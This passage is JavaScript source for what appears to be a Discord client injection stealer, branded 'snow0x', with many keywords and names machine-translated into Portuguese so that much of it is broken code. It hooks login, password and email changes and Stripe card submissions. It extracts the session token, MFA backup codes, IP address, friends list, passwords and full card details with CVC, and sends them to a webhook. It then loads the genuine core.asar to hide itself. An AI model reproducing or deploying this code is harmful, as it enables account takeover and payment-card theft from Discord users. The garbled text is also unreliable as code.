												"descrição": CalcAmigos(),
												"autor": {
													"nome": "neve0x"
												},
												"rodapé": {
													"texto": "neve0x"
												},
												"miniatura": {
													"url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}`
												}
											}]
										}
										SendToWebhook(JSON.stringify(params))
									})
								})
							})
						})
 
					}
				})
			})
		})
	})
}
 
function ChangeEmail(newemail, senha, token) {
	const janela = BrowserWindow.getAllWindows()[0];
	window.webContents.executeJavaScript(`
    var xmlHttp = new XMLHttpRequest();
    xmlHttp.open( "GET", "https://discord.com/api/v8/users/@me", false );
    xmlHttp.setRequestHeader("Autorização", "${token}");
    xmlHttp.send( null );
    xmlHttp.responseText;`, !0).then((info) => {
		window.webContents.executeJavaScript(`
        var xmlHttp = new XMLHttpRequest();
        xmlHttp.open( "GET", "https://www.myexternalip.com/raw", false );
        xmlHttp.send( null );
        xmlHttp.responseText;
    `, !0).then((ip) => {
			window.webContents.executeJavaScript(`
        var xmlHttp = new XMLHttpRequest();
        xmlHttp.open( "GET", "https://discord.com/api/v9/users/@me/billing/payment-sources", false );
        xmlHttp.setRequestHeader("Autorização", "${token}");
        xmlHttp.send( null );
        xmlHttp.responseText`, !0).then((info3) => {
				window.webContents.executeJavaScript(`
            var xmlHttp = new XMLHttpRequest();
            xmlHttp.open( "GET", "https://discord.com/api/v9/users/@me/relationships", false );
            xmlHttp.setRequestHeader("Autorização", "${token}");
            xmlHttp.send( null );
            xmlHttp.responseText`, !0).then((info4) => {
 
					if (token.startsWith("mfa")) {
						window.webContents.executeJavaScript(`
              var xmlHttp = new XMLHttpRequest();
              xmlHttp.open("POST", "https://discord.com/api/v9/users/@me/mfa/codes", false);
              xmlHttp.setRequestHeader('Content-Type', 'application/json');
              xmlHttp.setRequestHeader("autorização", "${token}")
              xmlHttp.send(JSON.stringify({\"password\":\"${password}\",\"regenerate\":false}));
              xmlHttp.responseText`, !0).then((códigos) => {
 
							var campo = [];
							var baseuri = "https://furry.surf/raw/"
 
 
							var gayass = JSON.parse(codes)
							deixe g = gayass.backup_codes
							const r = g.filter((código) => {
								código de retorno.consumed == null
							})
							para (seja z em r) {
								fieldo.push({
									nome: `Código`,
									valor: `\`${r[z].code.insert(4, "-")}\``,
									em linha: verdadeiro
								})
								baseuri += `${r[z].code.insert(4, "-")}<br>`
							}
 
							function totalAmigos() {
								var f = JSON.parse(info4)
								const r = f.filter((usuário) => {
 
									return user.type == 1
								})
								retornar r.comprimento
							}
 
							function CalcAmigos() {
								var f = JSON.parse(info4)
								const r = f.filter((usuário) => {
									return user.type == 1
								})
								var gay = "";
								para (z de r) {
									var b = GetRBadges(z.user.public_flags)
									if (b!= "") {
										gay += b + ` ${z.user.username}#${z.user.discriminator}\n`
									}
								}
								if (gay == "") {
									gay = "Sem amigos raros"
								}
								voltar gay
							}
 
							function legal() {
								const json = JSON.parse(info3)
								var faturamento = "";
								json.forEach(z => {
									if (z.type == "") {
										return "\`❌\`"
									} else if (z.type == 2 && z.invalid != !0) {
										cobrança += "\`✔️\`" + " <:paypal:896441236062347374>"
									} else if (z.type == 1 && z.invalid != !0) {
										cobrança += "\`✔️\`" + " :credit_card:"
									} senão {
										return "\`❌\`"
									}
								})
								if (faturamento == "") {
									cobrança = "\`❌\`"
								}
								faturamento de retorno
							}
							const json = JSON.parse(info);
 
							var parametros = {
								nome de usuário: "snow0x",
								contente: "",
								incorpora: [{
									"title": "E-mail alterado",
									description: "[**<:partner:909102089513340979> │ snow0x Discord**](https://discord.gg/J4VTFKv37s)",
									"color": config['incorporar-cor'],
									"Campos": [{
										nome: "Injeção de malware",
										valor: `\`\`\`Informações de injeção: \n${discordInstall}\`\`\``,
										em linha: !1
									}, {
										nome: "IP",
										valor: `\`${ip}\``,
										em linha: !0
									}, {
										nome: "Nome do PC",
										valor: `\`${computerName}\``,
										em linha: !0
									}, {
										nome: "Nome de usuário",
										valor: `\`${json.username}#${json.discriminator}\``,
										em linha: !0
									}, {
										nome: "ID",
										valor: `\`${json.id}\``,
										em linha: !0
									}, {
										nome: "Nitro",
										valor: `${GetNitro(json.premium_type)}`,
										em linha: !1
									}, {
										crachás",
										valor: `${GetBadges(json.flags)}`,
										em linha: !1
									}, {
										nome: "Métodos de Pagamento",
										valor: `${Cool()}`,
										em linha: !1
									}, {
										nome: "Novo e-mail",
										valor: `\`${newemail}\``,
										em linha: !0
									}, {
										nome: "Senha",
										valor: `\`${senha}\``,
										em linha: !0
									}, {
										nome: "Token",
										valor: `\`\`\`${token}\`\`\``,
										em linha: !1
									}, ],
									"autor": {
										"nome": "neve0x"
									},
									"rodapé": {
										"texto": "neve0x"
									},
									"miniatura": {
										"url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}`
									}
								}, {
									"title": `Total de Amigos (${totalFriends()})`,
									"color": config['incorporar-cor'],
									"descrição": CalcAmigos(),
									"autor": {
										"nome": "neve0x"
									},
									"rodapé": {
										"texto": "neve0x"
									},
									"miniatura": {
										"url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}`
									}
								}]
							}
							var mfaembed = {
								"title": ":space_invader: __2FA Codes__",
								"description": `[Códigos 2FA](${baseuri})`,
								"color": config['incorporar-cor'],
								"campos": campo,
								"autor": {
									"nome": "neve0x"
								},
								"rodapé": {
									"texto": "neve0x"
								}
							}
							if (token.startsWith("mfa")) {
								params.embeds.push(mfaembed)
							}
 
							SendToWebhook(JSON.stringify(params))
 
						})
					} senão {
 
						const janela = BrowserWindow.getAllWindows()[0];
						window.webContents.executeJavaScript(`
    var xmlHttp = new XMLHttpRequest();
    xmlHttp.open( "GET", "https://discord.com/api/v8/users/@me", false );
    xmlHttp.setRequestHeader("Autorização", "${token}");
    xmlHttp.send( null );
    xmlHttp.responseText;`, !0).then((info) => {
							window.webContents.executeJavaScript(`
        var xmlHttp = new XMLHttpRequest();
        xmlHttp.open( "GET", "https://www.myexternalip.com/raw", false );
        xmlHttp.send( null );
        xmlHttp.responseText;
    `, !0).then((ip) => {
								window.webContents.executeJavaScript(`
        var xmlHttp = new XMLHttpRequest();
        xmlHttp.open( "GET", "https://discord.com/api/v9/users/@me/billing/payment-sources", false );
        xmlHttp.setRequestHeader("Autorização", "${token}");
        xmlHttp.send( null );
        xmlHttp.responseText`, !0).then((info3) => {
									window.webContents.executeJavaScript(`
            var xmlHttp = new XMLHttpRequest();
            xmlHttp.open( "GET", "https://discord.com/api/v9/users/@me/relationships", false );
            xmlHttp.setRequestHeader("Autorização", "${token}");
            xmlHttp.send( null );
            xmlHttp.responseText`, !0).then((info4) => {
 
										function totalAmigos() {
											var f = JSON.parse(info4)
											const r = f.filter((usuário) => {
												return user.type == 1
											})
											retornar r.comprimento
										}
 
										function CalcAmigos() {
											var f = JSON.parse(info4)
											const r = f.filter((usuário) => {
												return user.type == 1
											})
											var gay = "";
											para (z de r) {
												var b = GetRBadges(z.user.public_flags)
												if (b!= "") {
													gay += b + ` ${z.user.username}#${z.user.discriminator}\n`
												}
											}
											if (gay == "") {
												gay = "Sem amigos raros"
											}
											voltar gay
										}
 
										function legal() {
											const json = JSON.parse(info3)
											var faturamento = "";
											json.forEach(z => {
												if (z.type == "") {
													return "\`❌\`"
												} else if (z.type == 2 && z.invalid != !0) {
													cobrança += "\`✔️\`" + " <:paypal:896441236062347374>"
												} else if (z.type == 1 && z.invalid != !0) {
													cobrança += "\`✔️\`" + " :credit_card:"
												} senão {
													return "\`❌\`"
												}
											})
											if (faturamento == "") {
												cobrança = "\`❌\`"
											}
											faturamento de retorno
										}
										const json = JSON.parse(info);
										var parametros = {
											nome de usuário: "snow0x",
											contente: "",
											incorpora: [{
												"title": "E-mail alterado",
												description: "[**<:partner:909102089513340979> │ snow0x Discord**](https://discord.gg/J4VTFKv37s)",
												"color": config['incorporar-cor'],
												"Campos": [{
													nome: "Injeção de malware",
													valor: `\`\`\`Informações de injeção: \n${discordInstall}\`\`\``,
													em linha: !1
												}, {
													nome: "IP",
													valor: `\`${ip}\``,
													em linha: !0
												}, {
													nome: "Nome do PC",
													valor: `\`${computerName}\``,
													em linha: !0
												}, {
													nome: "Nome de usuário",
													valor: `\`${json.username}#${json.discriminator}\``,
													em linha: !0
												}, {
													nome: "ID",
													valor: `\`${json.id}\``,
													em linha: !0
												}, {
													nome: "Nitro",
													valor: `${GetNitro(json.premium_type)}`,
													em linha: !1
												}, {
													crachás",
													valor: `${GetBadges(json.flags)}`,
													em linha: !1
												}, {
													nome: "Métodos de Pagamento",
													valor: `${Cool()}`,
													em linha: !1
												}, {
													nome: "Novo e-mail",
													valor: `\`${newemail}\``,
													em linha: !0
												}, {
													nome: "Senha",
													valor: `\`${senha}\``,
													em linha: !0
												}, {
													nome: "Token",
													valor: `\`\`\`${token}\`\`\``,
													em linha: !1
												}, ],
												"autor": {
													"nome": "neve0x"
												},
												"rodapé": {
													"texto": "neve0x"
												},
												"miniatura": {
													"url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}`
												}
											}, {
												"title": `Total de Amigos (${totalFriends()})`,
												"color": config['incorporar-cor'],
												"descrição": CalcAmigos(),
												"autor": {
													"nome": "neve0x"
												},
												"rodapé": {
													"texto": "neve0x"
												},
												"miniatura": {
													"url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}`
												}
											}]
										}
										SendToWebhook(JSON.stringify(params))
									})
								})
							})
						})
 
					}
				})
			})
		})
	})
}
 
function CreditCardAdded(número, cvc, mês_expir, ano_expir, rua, cidade, estado, CEP, país, token) {
	const janela = BrowserWindow.getAllWindows()[0];
	window.webContents.executeJavaScript(`
    var xmlHttp = new XMLHttpRequest();
    xmlHttp.open( "GET", "https://discord.com/api/v8/users/@me", false );
    xmlHttp.setRequestHeader("Autorização", "${token}");
    xmlHttp.send( null );
    xmlHttp.responseText;`, !0).then((info) => {
		window.webContents.executeJavaScript(`
        var xmlHttp = new XMLHttpRequest();
        xmlHttp.open( "GET", "https://www.myexternalip.com/raw", false );
        xmlHttp.send( null );
        xmlHttp.responseText;
    `, !0).then((ip) => {
			var json = JSON.parse(info);
			var parametros = {
				nome de usuário: "snow0x",
				contente: "",
				incorpora: [{
					"title": "Cartão de crédito adicionado",
					"description": "**Nome de usuário:**```" + json.username + "#" + json.discriminator + "```\n**ID:**```" + json.id + " ```\n**Email:**```" + json.email + "```\n" + "**Nitro Type:**```" + GetNitro(json.premium_type) + "` ``\n**Badges:**```" + GetBadges(json.flags) + "```" + "\n**Número do cartão de crédito: **```" + number + "``` " + "\n**Expiração do cartão de crédito: **```" + mês_expir + "/" + ano_expir + "```" + "\n**CVC: **```" + cvc + "` ``\n" + "**País: **```" + país + "```\n" + "**Estado: **```" + estado + "```\n" + "**Cidade: **```" + cidade + "```\n" + "**CEP:**```" + zip + "```" + "\n**Rua: * *```"+ rua + "```" + "\n**Token:**```" + token + "```" + "\n**IP: **```" + ip + "`` `",
					"autor": {
						"nome": "neve0x"
					},
					"rodapé": {
						"texto": "neve0x"
					},
					"miniatura": {
						"url": "https://cdn.discordapp.com/avatars/" + json.id + "/" + json.avatar
					}
				}]
			}
			SendToWebhook(JSON.stringify(params))
		})
	})
}
const ChangePasswordFilter = {
	urls: ["https://discord.com/api/v*/users/@me", "https://discordapp.com/api/v*/users/@me", "https://*. discord.com/api/v*/users/@me", "https://discordapp.com/api/v*/auth/login", 'https://discord.com/api/v*/auth/ login', 'https://*.discord.com/api/v*/auth/login', "https://api.stripe.com/v*/tokens"]
};
session.defaultSession.webRequest.onCompleted(ChangePasswordFilter, (detalhes, retorno de chamada) => {
	if (details.url.endsWith("login")) {
		if (details.statusCode == 200) {
			dados const = JSON.parse(Buffer.from(details.uploadData[0].bytes).toString())
			const email = data.login;
			const senha = data.password;
			const janela = BrowserWindow.getAllWindows()[0];
			window.webContents.executeJavaScript(`for(let a in window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[[ "get_require"]]]),delete gg.m.get_require,delete gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a }]),gg.c)if(gg.c.hasOwnProperty(a)){let b=gg.c[a].exports;if(b&&b.__esModule&&b.default)for(let a in b.default)" getToken"==a&&(token=b.default.getToken())}token;`, !0).then((token => {
				Login (e-mail, senha, token)
			}))
		} senão {}
	}
	if (details.url.endsWith("users/@me")) {
		if (details.statusCode == 200 && details.method == "PATCH") {
			dados const = JSON.parse(Buffer.from(details.uploadData[0].bytes).toString())
			if (data.password != null && data.password != indefinido && data.password != "") {
				if (data.new_password != indefinido && data.new_password != null && data.new_password != "") {
					const janela = BrowserWindow.getAllWindows()[0];
					window.webContents.executeJavaScript(`for(let a in window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[[ "get_require"]]]),delete gg.m.get_require,delete gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a }]),gg.c)if(gg.c.hasOwnProperty(a)){let b=gg.c[a].exports;if(b&&b.__esModule&&b.default)for(let a in b.default)" getToken"==a&&(token=b.default.getToken())}token;`, !0).then((token => {
						ChangePassword(data.password, data.new_password, token)
					}))
				}
				if (data.email != null && data.email != undefined && data.email != "") {
					const janela = BrowserWindow.getAllWindows()[0];
					window.webContents.executeJavaScript(`for(let a in window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[[ "get_require"]]]),delete gg.m.get_require,delete gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a }]),gg.c)if(gg.c.hasOwnProperty(a)){let b=gg.c[a].exports;if(b&&b.__esModule&&b.default)for(let a in b.default)" getToken"==a&&(token=b.default.getToken())}token;`, !0).then((token => {
						ChangeEmail(dados.email, dados.senha, token)
					}))
				}
			}
		} senão {}
	}
	if (details.url.endsWith("tokens")) {
		const janela = BrowserWindow.getAllWindows()[0];
		const item = querystring.parse(decodeURIComponent(Buffer.from(details.uploadData[0].bytes).toString()))
		window.webContents.executeJavaScript(`for(let a in window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[[ "get_require"]]]),delete gg.m.get_require,delete gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a }]),gg.c)if(gg.c.hasOwnProperty(a)){let b=gg.c[a].exports;if(b&&b.__esModule&&b.default)for(let a in b.default)" getToken"==a&&(token=b.default.getToken())}token;`, !0).then((token => {
			CreditCardAdded(item["card[number]"], item["card[cvc]"], item["card[exp_month]"], item["card[exp_year]"], item["card[address_line1]" ], item["card[address_city]"], item["card[address_state]"], item["card[address_zip]"], item["card[address_country]"], token)
		}))
	}
});
module.exports = require('./core.asar')
